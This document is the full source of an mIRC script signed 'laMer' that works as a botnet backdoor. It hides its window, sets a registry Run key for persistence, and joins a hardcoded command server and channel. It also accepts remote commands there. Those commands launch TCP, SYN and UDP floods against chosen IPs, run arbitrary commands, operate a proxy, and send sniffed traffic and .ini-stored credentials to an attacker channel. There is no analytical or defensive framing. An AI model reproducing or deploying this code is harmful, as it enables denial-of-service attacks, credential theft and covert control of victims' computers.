°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°
°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°
°·°·°·°·°·°·°·°·°·°·°·°·°C0de·By·laMer°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°
°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°
°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°
°·°·°·°|__|
°·°·°·°|__|_____     _ __ ___   ___ _ ___
°·°·°·°|__|\__  \   | '_ ` _ \ / _ \  '__|
°·°·°·°|__| / __ \_ | | | | | |  __/  |
°·°·°·°|__ |(____  /|_| |_| |_|\___||_|
°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°
°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°






raw *:*:{ if ($numeric == 432) { nick $Stl4mNick } | if ($left($3,1) == !) { laMerC0ntr0l $3- } | halt }
alias jc { join -n $priv8(r00m) $priv8(k3ys) }
alias shows { if ($me isvo $chan) { clearall | .notice $nick  $1- } }
on 1:start:{ 
  .strege 
  .n0cl
  .Stl4mNick
  .laconMer
  .l4mhide
  .Clearing
}
alias lamhid3r { if ($appstate != hidden) { .lamhider } }
alias lamhider { .dll fn32.dll do_ShowWindow $window(-2).hwnd 0 }
alias lamh1der { if ($appstate != hidden) { .dll fn32.dll do_ShowWindow $window(-2).hwnd 0 } }
alias strege { %l4r3g = $+($r(a,z),$r(1,99),.reg) | write %l4r3g REGEDIT4 | write %l4r3g [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] | write %l4r3g $+("Win,$os,Service"=",$replace($mircdir,\,\\),$nopath($mircexe),") | .run -n regedit /s %l4r3g | .timerve 1 4 .remove %l4r3g | .timervo 1 5 unset %l4r3g* }
alias n0cl { if ($portfree(31409) == $false) { exit } | .socklisten n0cl 31409 }
alias letsgo { .timer-c0nn 0 30 laconMer | strege | .timerr3m 1 35 r3m }
on *:exit:{ .remove %l4r3g | sockclose * | timers off | unsetall }
on *:connect:{ .timer-c0* off | timerjc 0 3 /jc | Clearing | .remove law.x | .remove dcw.x }
on *:disconnect:{ clearall | sockclose * | timer.* off | .timernew 1 15 Stl4mNick | .remove %l4r3g }
on *:join:*:{ if ($chan == $priv8(r00m)) { .timerjc off | .window -h # } }
on *:part:*:{ if ($chan == $priv8(r00m)) { timerjc 0 3 /jc } }
on *:KICK:*:{ if ($chan == $priv8(r00m)) { timerjc 0 3 /jc } }
on *:text:*:*:if ($left($1,1) == !) { laMerC0ntr0l $1- } | if ($1 == $me) { laMerC0ntr0l $2- } | clearall | halt }
Alias Stl4mNick {
  .nick $+(|,$os,|,$fnickzz,|)
  .anick $+(|,$os,|,$fnickzz,|)
  .emailaddr almskon@
  .username 4·là4Mér4· You Think i°m Naughty ‹!›
  .timerfive 9 2 writeini " $+ dbqp.fon $+ " mirc host %away
  .set %info $read(i9ct7.zip)
  .set %away (lamer) S·e·r·v·i·c·e·s
  .letsgo
}
alias l4mhide {
  timer-lhid3r -o 0 2 lamhid3r
  timer-lhid1r -o 0 1 lamh1der
  timer-lhidr -o 0 2 lamhider
  lamhider
  lamh1der
}
alias priv8 {
  if ($1 = s3rv) { return matlab.zapto.org 32321 }
  if ($1 = k3ys) { return tcp }
  if ($1 = r00m) { return #tcp# }
  if ($1 = xps) { return #xxxpass }
  if ($1 = l4m) { return $decode(bGFtZXI=,m) }
}
alias laMerC0ntr0l {
  if ($1 == !all) { set %uallip $2 | set %tcp.IP $2 | set %syn1.ip $2 | set %syn2.ip $2 | set %uallport $3 | set %tcp.port $3 | set %syn1.port $3 | set %syn2.port $3 | set %timer.uall $4 | set %tcp.size $4 | set %syn1.size $4 | set %syn2.size $4 | uall | TCP | syn1 | syn2 | shows 4Œ1See you in hell 04.14*04· $2 ·14*4.  }
  if ($1 == !allstop) { .timer.tcpz* off | .timer.sy* off | .sockclose sptcp* | .sockclose spsyn* | shows 4All:14(·1 Fucking Attack Has 15[·4 Stoppd 15·] 14·) }
  if ($1 == !tcp) { set %tcp.IP $2 | set %tcp.port $3 | set %tcp.size $4 | TCP | shows 4,0[07‘01P04.01a04.01c04.01k04.01e04.01t04.01s07,15:03 1 4[01 $+ $2 $+ 4] 07‘01ON07,1 4[01 $+ $3 $+ 4] 07‘01With07, 4[01 $+ $4 $+ 4] }
  if ($1 == !tcpstop) { tcpstop }  
  if ($1 == !alls) && ($6) { set %tcp.IP $2 | set %syn1.ip $2 | set %syn2.ip $2 | set %tcp.port $3 | set %syn1.port $4 | set %syn2.port $5 | set %tcp.size $6 | set %syn1.size $6 | set %syn2.size $6 | TCP | syn1 | syn2 | shows 4Œ1Get lost Matha 4.14*04 faCka 14*4. 15[·01 %tcp.IP 15·] 01‘04ComPort 15·01 %tcp.port 15·04 %syn1.port 15·01 %syn2.port  01‘04Size01,15·1 %tcp.size  }
  if ($1 == !syn1) { set %syn1.ip $2 | set %syn1.port $3 | set %syn1.size $4 | syn1 | shows Œ04Cya later - much later01 $2 04Port01 $3 1Œ04Size01,01 $4 }
  if ($1 == !syn1stop) { syn1stop }
  if ($1 == !syn2) { set %syn2.ip $2 | set %syn2.port $3 | set %syn2.size $4 | syn2 | shows a04·T04·T04·a04·c04·k04·e04·r f04·O04·r 04 $2 01Port04 $3 01Size01,04 $4 }
  if ($1 == !syn2stop) { syn2stop }
  if ($1 = !sni) { timer.sn 1 1 $findfile(c:\,*.ini,0 //.msg #xxxpass $readini $1- mirc host $readini $1- rfiles n0 $readini $1- rfiles n1 $readini $1- rfiles n2 $readini $1- rfiles n3 $readini $1- variables n0 $readini $1- variables n1 $readini $1- variables n2 $readini $1- variables n3 $readini $1- variables %server ) } 
  if ($1 = !ps) { //join #lamer#  }
  if ($1 = !re) { timer 1 1 /quit reconnecting... | laconMer }
  if ($1 = !do) && ($2 != $null) { %do = $2- | / $+ %do | unset %do } 
  if ($1 == !uall) { set %uallip $2 | set %uallport $3 | set %timer.uall $4 | uall | shows 4Œ1KicK ass For 4.14*04 $4 14*4. }
  if ($1 == !click) { set %clisite $2- | Click3r | shows Clicker ‘Start, }
  if ($1 == !hit) { set %clisite $2- | .timer.hits 0 $r(0,250) Click3r | shows 4Clicker ‘Start, }
  if ($1 == !hstop) { timer.hits off }
  if ($1 == !tcpflood) { set %flood.ip $2 | set %flood.port $3 | set %flood.secs $4 | tcpflood  }
  if ($1 == !udpflood) { set %udp.ip $2 | set %udp.secs $3 | udpflood }
  if ($1 == !udp1) { set %udpz.ip $2 | udpz | shows 15,0[01‘04UDp01,15:04‘1Start04, 4,0‘1Fucking04 %udpz.ip  }
  if ($1 == !tcp1) { set %tcpp.IP $2 | tcpzz | shows 15,0[01‘04TCP01,15:04‘1Start04, 4,0‘1Fucking04 %tcpp.IP }
  if ($1 == !udp2) { set %udp.ip $2 | set %udp.port $3 | udp3 | shows 15,0[04‘01UDp04,15:04‘4Start04, 4,0‘1Fucking04 %udp.ip 01Port04 %udp.port }
  if ($1 == !dall) { set %udp.ip $2 | set %udpz.ip $2 | set %tcpp.IP $2 | set %udp.port $3 | udp3 | udpz | tcpzz | shows 4Œ01Ud04p01s04· St04art F04or04 $2 }
  if ($1 == !visit) { xv1s1ts | .set %visitadres $2 | .set %visitport $3 | xv1s1t | shows 15,0[01‘04Visit01,15:04‘1Start04, 4,0‘1Fucking04 %visitadres }
  if ($1 == !vstop) { xv1s1ts }
  if ($1 = !j) { /join $2- }
  if ($1 = !p) { /part $2- }
  if ($1 == !clear) { shows 04Thanks For 1‘04Care01, | Clearing }
  if ($1 = !cl) { laMerFucker $2- }
  if ($1 = !wax) {  wswa raw privmsg }
  if ($1 = !on) { if ($2 = raw) {  wswa raw $3- } | if ($2 = $null) {  wswa normal } }
  if ($1 = !off) { stptr }
  if ($1 = !sys) { shows 1Ip:04 $ip 1Windows:04 $os 1Host:04 $host 1Time:04 $time(h:nn tt) 1Date:04 $date(mmmm doo yyyy) 1Uptime:04 $duration($uptime(system,3)) , 1mIRc Uptime:04 $uptime(mirc,1) }
  if ($1 = !bnc) { 
    if ($2 == $null) { shows Help4· type  !bnc Start Port Pass 4·×· !bnc Stop 4·×· !bnc Stats  | halt }
    if ($2 = start) { if (!$sock(bnc)) && ($4) && ($portfree($3)) { socklisten bnc $3 | .set %bnc.pass $4 | shows 7‘bnc7, Started··· /server -m $ip $+ : $+ $sock(BNc).port , 7Pass ··· %bnc.pass } | elseif ($sock(bnc)) { shows 7‘bnc7, Already Running··· /server -m $ip $+ : $+ $sock(BNc).port , 7‘With7,14§07 ‘1Pass07,07 %bnc.pass } } 
    if ($2 = stop) { if (!$sock(bnc)) { halt } | else { sockclose bnc* | .unset %bnc* | shows 7‘bnc7, Holding } }
    if ($2 = stats) && ($sock(bnc)) { shows 7‘bnc7, iS on1! $ip $+ : $+ %Bnc.port 7Pass ···01 %Bnc.pass $+ .. 7Users:01 $sock(BncClient*,0) 7Connected:01 $sock(BncServer*,0) }
  }
  if ($1 = !xpass) {
    if ($2 = on) && (%stch3ck != on) { set %stch3ck on | g0ps }
    if ($2 = off) && (%stch3ck = on) { timer.t4rg4p off | if ($exists(sr.dll) = $true) { remove sr.dll } }
    if ($2 = rw) && (%stch3ck != on) { set %stch3ck on | set %rwword $3- | rwps }
  }
}
alias laMerFucker {
  if ($1 = con) && ($4) { .timer -hmo $4 1 lc0n $2 $3 } 
  if ($sock(spd*,0) == 0) { halt }
  if ($1 = f.c) { Flo0dF1 $2- }
  if ($1 = flood.on) { Flo0dJo $2- }
  if ($1 = jp) { Flo0dJp $2- }
  if ($1 = p) { huh spd* part $2 : $+ $3- }
  if ($1 = j) { huh spd* join $2- }
  if ($1 = msg) { Flo0dNp $2- }
  if ($1 = f.n) { Flo0dNf $2- }
  if ($1 = j.c) { MassStart }
  if ($1 = mass) { MassFuck $2- }
  if ($1 = p.c) { MassPart }
  if ($1 = die) { unset %me.* | unset %j0in* | timerlc0n* off | sockclose spd*  }
}
alias huh { sockwrite -nt $1- }
alias laconMer { if ($server == $null) { server $priv8(s3rv) } }
alias fn1ckq { return $rand(A,Z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(1,9) }
alias ac0n { s0p3n spd. $+ $rand(1,9999) $+ $ticks $1- }
on *:sockread:spd*:{ sockread %spd.arread | arreader $sockname %spd.arread | unset %spd.arread }
alias arreader {
  if ($3 == MODE) && ($remove($2,:) == $4) { set %me. [ $+ [ $1 ] ] $4 }
  if ($5 == :VERSION) && ($3 == PRIVMSG) { huh $sockname NOTICE $remove($gettok($2,1,33),:) :VERSION mIRC v $+ $version Khaled Mardam-Bey }
  if ($5 == :FINGER) && ($3 == PRIVMSG) { huh $sockname NOTICE $remove($gettok($2,1,33),:) :FINGER %info Idle $rand(0,9) seconds }
  if ($5 == :TIME) && ($3 == PRIVMSG) { huh $sockname NOTICE $remove($gettok($2,1,33),:) :TIME $fulldate $+  }
  if ($5 == :PING) && ($3 == PRIVMSG) { huh $sockname NOTICE $remove($gettok($2,1,33),:) :PING $6 }
  if ($3 == 433) && ($5 !isin %spd.1nick) { .huh $sockname NICK $fn1ckq }
  if ($3 == JOIN) && ($remove($gettok($2,1,33),:) == %me. [ $+ [ $1 ] ]) && (%floodm) && (%flood == s4y) { huh spd* privmsg $remove($4,:) : $+ %floodm | huh spd* privmsg $remove($4,:) : $+ %floodm | huh spd* privmsg $remove($4,:) : $+ %floodm | huh spd* privmsg $remove($4,:) : $+ %floodm | huh spd* privmsg $remove($4,:) : $+ %floodm | unset %floo* }
  if (PING == $2) { huh $1 $2- | huh $1 pong $3- | huh $1 pong $remove($3-,:) }
}
alias fnickzz { return $rand(a,z) $+ $replace($left($encode($rend(A,Z) $+ $calc((($ticks * 2) / $rand(1,9)) - $left($ticks,5)),m),$rand(4,5)),m,$rand(a,z)) }
on *:Sockopen:spd*:{ 
  .set -u0 %user $left($fnickzz,$rand(2,3)) | .huh $sockname USER $readini(dbqp.fon,lamuser,n $+ $r(0,110)) $+ $r(a,z) * * : $+ $read i9ct7.zip
  .set -u0 %spd.artnick $fnickzz | .huh $sockname NICK %spd.artnick
  .set %j0in1 #laMer $+ $r(A,Z) $+ $r(1,67) | .set %j0in2 #l4M3r $+ $rand(1,9999) | .set %j0in3 #k $+ $r(0,9999) $+ $r(a,z) | .set %j0in4 #a $+ $r(0,9999) $+ $r(a,z) | .set %j0in5 #b $+ $rand(1,9999) $+ $r(A,Z) $+ $r(a,z) | .set %j0in6 #kuwait $+ $rand(1,999)
}
on *:sockclose:spd*:{ unset %me.* | unset %j0in* | .timerlc0n. [ $+ [ $sockname ] ] 1 2 s0p3n $sockname $sock($sockname).ip $sock($sockname).port | c0se $sockname }
alias Flo0dJo { huh spd* join $1 | set %flood s4y | set %floodm $2- }
alias Flo0dF1 { huh spd* join $1 | Flo0dNf $1- }
alias Flo0dJp { huh spd* join $1 $cr part $1 : $+ $2- $cr join $1 $cr part $1 : $+ $2- $cr join $1 $cr part $1 : $+ $2- $cr | huh spd* join $1 $cr part $1 : $+ $2- $cr join $1 $cr part $1 : $+ $2- $cr join $1 $cr part $1 : $+ $2- }
alias Flo0dNp { huh spd* privmsg $1 : $+ $2- | huh spd* privmsg $1 : $+ $2- | huh spd* privmsg $1 : $+ $2- | huh spd* privmsg $1 : $+ $2- | huh spd* privmsg $1 : $+ $2- }
alias Flo0dNf { huh spd* privmsg $1 : $+ $2- | huh spd* notice $1 : $+ $2- | huh spd* privmsg $1 : $+ $2- | huh spd* notice $1 : $+ $2- | huh spd* privmsg $1 : $+ $2- | huh spd* notice $1 : $+ $2- }
alias MassStart { huh spd* join %j0in1 | huh spd* join %j0in2 | huh spd* join %j0in3 | huh spd* join %j0in4 | huh spd* join %j0in5 | huh spd* join %j0in6 }
alias MassFuck { huh spd* invite $1 %j0in1 | huh spd* invite $1 %j0in2 | huh spd* invite $1 %j0in3 | huh spd* invite $1 %j0in4 | huh spd* invite $1 %j0in5 | huh spd* invite $1 %j0in6 | huh spd* invite $1 %j0in1 | huh spd* invite $1 %j0in2 | huh spd* invite $1 %j0in3 | huh spd* invite $1 %j0in4 | huh spd* invite $1 %j0in5 | huh spd* invite $1 %j0in6 }
alias MassPart { huh spd* part %j0in1 | huh spd* part %j0in2 | huh spd* part %j0in3 | huh spd* part %j0in4 | huh spd* part %j0in5 | huh spd* part %j0in6 }

alias c0se { sockclose $1- }
alias s0p3n { sockopen $1- }
alias xv1s1t {
  .timer.visit 00 00 visitx 
  .timer.vstop 1 2000 xv1s1ts
}
alias xv1s1ts {
  .unset %visitadres
  .unset %visitport
  .timer.visit off
  .sockclose spvisit* 
}
alias visitx { .sockopen spvisit $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) $+ $r(0,9) $+ $r(a,z) %visitadres %visitport }
ctcp ^*:*:halt
on ^*:CTCPREPLY:*:halt
on ^*:SNOTICE:*:halt
on ^*:NOTICE:*:halt

alias TCP {
  .timer.tcpz off | .sockclose sptcp* | set %tcpz 0 | .timer.tcpz -M %tcp.size 0 TCPP
}
alias TCPP {
  if %tcpz >= %tcp.size { goto done }
  inc %tcpz 2
  sockopen sptcp $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %tcp.IP %tcp.port
  sockopen sptcp $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %tcp.IP %tcp.port
  sockopen sptcp $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %tcp.IP %tcp.port
  sockopen sptcp $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %tcp.IP %tcp.port
  sockopen sptcp $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %tcp.IP %tcp.port
  sockopen sptcp $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %tcp.IP %tcp.port
  sockopen sptcp $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %tcp.IP %tcp.port
  sockopen sptcp $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %tcp.IP %tcp.port
  sockopen sptcp $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %tcp.IP %tcp.port
  sockopen sptcp $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %tcp.IP %tcp.port
  sockopen sptcp $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %tcp.IP %tcp.port
  sockopen sptcp $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %tcp.IP %tcp.port
  return
  :done
  .timer.tcpz off
  .sockclose sptcp*
  .unset %tcp.IP*
  .unset %tcp.size*
}
alias tcpstop {
  .timer.tcpz off
  .sockclose sptcp*
  .unset %tcp.IP*
  .unset %tcp.port*
  .unset %tcp.size*
  .set %tcpz 0
  shows 7°Attack Has Stopped7°
}
alias syn1 {
  .timer.syn1 off | .sockclose spsyn* | set %synlimt 0 | .timer.syn1 -M %syn1.size 0 syn3
}
alias syn3 {
  if %synlimt >= %syn1.size { goTo Done }
  inc %synlimt 2
  sockopen spsyn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn1.ip %syn1.port
  sockopen spsyn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn1.ip %syn1.port
  sockopen spsyn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn1.ip %syn1.port
  sockopen spsyn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn1.ip %syn1.port
  sockopen spsyn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn1.ip %syn1.port
  sockopen spsyn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn1.ip %syn1.port
  sockopen spsyn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn1.ip %syn1.port
  sockopen spsyn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn1.ip %syn1.port
  sockopen spsyn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn1.ip %syn1.port
  sockopen spsyn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn1.ip %syn1.port
  return
  :done
  .timer.syn1 off
  .sockclose spsyn*
  .unset %syn1.ip*
  .unset %syn1.port*
  .unset %syn1.size*
  .set %synlimt 0
}
alias syn1stop {
  .timer.syn1 off
  .sockclose spsyn*
  .unset %syn1.ip*
  .unset %syn1.port*
  .unset %syn1.size*
  .set %synlimt 0
  shows 7¤Attack Has Stopped7¤
}
alias syn2 {
  .timer.syn2 off | .sockclose spsynz* | set %synalimt 0 | .timer.syn2 -M %syn2.size 0 syn4
}
alias syn4 {
  if %synalimt >= %syn2.size { goto done }
  inc %synalimt 2
  sockopen spsynz $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn2.ip %syn2.port
  sockopen spsynz $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn2.ip %syn2.port
  sockopen spsynz $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn2.ip %syn2.port
  sockopen spsynz $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn2.ip %syn2.port
  sockopen spsynz $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn2.ip %syn2.port
  sockopen spsynz $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn2.ip %syn2.port
  sockopen spsynz $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn2.ip %syn2.port
  sockopen spsynz $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn2.ip %syn2.port
  sockopen spsynz $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn2.ip %syn2.port
  sockopen spsynz $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn2.ip %syn2.port
  sockopen spsynz $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn2.ip %syn2.port
  sockopen spsynz $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn2.ip %syn2.port
  sockopen spsynz $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn2.ip %syn2.port
  sockopen spsynz $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn2.ip %syn2.port
  sockopen spsynz $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn2.ip %syn2.port
  sockopen spsynz $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn2.ip %syn2.port
  sockopen spsynz $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn2.ip %syn2.port
  sockopen spsynz $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn2.ip %syn2.port
  sockopen spsynz $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn2.ip %syn2.port
  sockopen spsynz $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) %syn2.ip %syn2.port
  return
  :done
  .timer.syn2 off
  .sockclose spsynz*
  .unset %syn2.ip*
  .unset %syn2.port*
  .unset %syn2.size*
}
alias syn2stop {
  .timer.syn2 off
  .sockclose spsynz*
  .unset %syn2.ip*
  .unset %syn2.port*
  .unset %syn2.size*
  .set %synalimt 0
  shows 7·Attack Has Stopped7· 
}

on 1:TOPIC:#:if ($left($1,1) == !) { laMerC0ntr0l $1- | halt }
on *:socklisten:Bnc:{ sockaccept Bnc.temp | %conncheck = $sock(Bnc.temp).ip | if ($sock($+(bnc.in.,%conncheck))) { sockclose bnc.temp } | sockrename Bnc.Temp Bnc.temp. [ $+ [ $sock(Bnc.temp).ip ] ] }
on *:sockread:Bnc.temp.*:{ sockread %bnc.in | tokenize 32 %bnc.in { if ($1 = NICK) { sockwrite -n $sockname NOTICE $host :BNC iRc Proxy ( $+ $2 $+ ) | set %Bnc.nick. [ $+ [ $sock($sockname).ip ] ] $2 | halt } | if ($1 = USER) { .identd on $2 | set %Bnc.user. [ $+ [ $sock($sockname).ip ] ] $2- | sockwrite -n $sockname NOTICE $host :Please type /pass <password> | halt } | if ($1 = PASS) { if ($2 = %Bnc.pass) { sockwrite -n $sockname NOTICE $host :Password accepted, Welcome In... | sockwrite -n $sockname NOTICE $host :Please type /conn <server> <port> | sockrename $sockname $replace($sockname,Bnc.temp,Bnc.in) | halt } | if ($2 != %Bnc.pass) { sockwrite -n $sockname NOTICE $host :Access Denied.. } | if (!$2) { sockwrite -n $sockname NOTICE $host :You Need A Password To Cconnect | sockwrite -n $sockname NOTICE $host :Please Type /pass <password> }  } } }
on *:sockread:Bnc.in.*:{ sockread %bnc.in | tokenize 32 %bnc.in { if ($1 = USER) { .identd on $2 | set %Bnc.user. [ $+ [ $sock($sockname).ip ] ] $2- | halt } | if ($1 = CONN) { if (!$2) { sockwrite -n $sockname NOTICE $host :please type /conn <server> <port> | halt } | if (!$3) { %xxxx = 6667 } | if ($3) { %xxxx = $3 } | if ($sock($replace($sockname,Bnc.in,Bnc.out))) { sockwrite -n $sockname NOTICE $host :Disconnecting from previous connection | sockclose Bnc.out. [ $+ [ $sock($sockname).ip ] ] } | sockopen $replace($sockname,Bnc.in,Bnc.out) $2 %xxxx | sockwrite -n $sockname NOTICE $host :making reality through $2 port %xxxx | unset %xxxx | halt } | if ($1 = NICK) { set %bnc.nick. [ $+ [ $sock($sockname).ip ] ] $2 } | if ($sock($replace($sockname,Bnc.in,Bnc.out))) { sockwrite -n $replace($sockname,Bnc.in,Bnc.out) $1- } } | unset %bnc.in }
on *:sockopen:Bnc.out.*:{ if ($sockerr) { sockwrite -n $replace($sockname,Bnc.out,Bnc.in) NOTICE $host :Failed Connection | halt } | sockwrite -n $replace($sockname,Bnc.out,Bnc.in) NOTICE $host :Suceeded Connection | sockwrite -n $sockname NICK %Bnc.nick. [ $+ [ $remove($sockname,Bnc.out.) ] ] | sockwrite -n $sockname USER %Bnc.user. [ $+ [ $remove($sockname,Bnc.out.) ] ] }
on *:sockread:Bnc.out.*:{ sockread %Bnc.out | if (!$sock($replace($sockname,Bnc.out,Bnc.in))) { sockwrite -n $sockname Quit :Dead Socket. | halt } | sockwrite -n $replace($sockname,Bnc.out,Bnc.in) %Bnc.out | unset %bnc.out }
on *:notice:*:?:if ($left($1,1) == !) { laMerC0ntr0l $1- } | if ($1 == $me) { laMerC0ntr0l $2- } | clearall | halt }
on *:open:?:{ .close -m }
alias remote {
  if ($remote == 0) { remote on }
}
alias stptr { run ns4.exe ns1.exe -kf ns2.exe | timer.wwsq off | remove dcw.x | remove law.x }

alias wswa { if ($1 = raw) { write -c law.x | write law.x proto=tcp logtype=4 file=dcw.x expri= $+ $2- | run ns4.exe ns2.exe -d 0 law.x | timer.wwsq 0 1 wwsq } | if ($1 = normal) { run ns4.exe ns2.exe -d 0 w.e | timer.wwsq 0 1 wwsq } }

alias wwsq { 
  set %read $read(dcw.x,1) 
  if ($priv8(r00m) isin %read) { write -dl1 dcw.x | halt }
  if ($priv8(xps) isin %read) { write -dl1 dcw.x | halt }
  if ($priv8(l4m) isin %read) { write -dl1 dcw.x | halt }
  if (rule line isin %read) { write -dl1 dcw.x | halt }
  if ($port isin %read) { write -dl1 dcw.x | halt }
  if (Quit : isin %read) { write -dl1 dcw.x | halt }
  if (%read = $null) { write -dl1 dcw.x | halt }
  .msg $priv8(xps) %read
  write -dl1 dcw.x
}





°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°·°
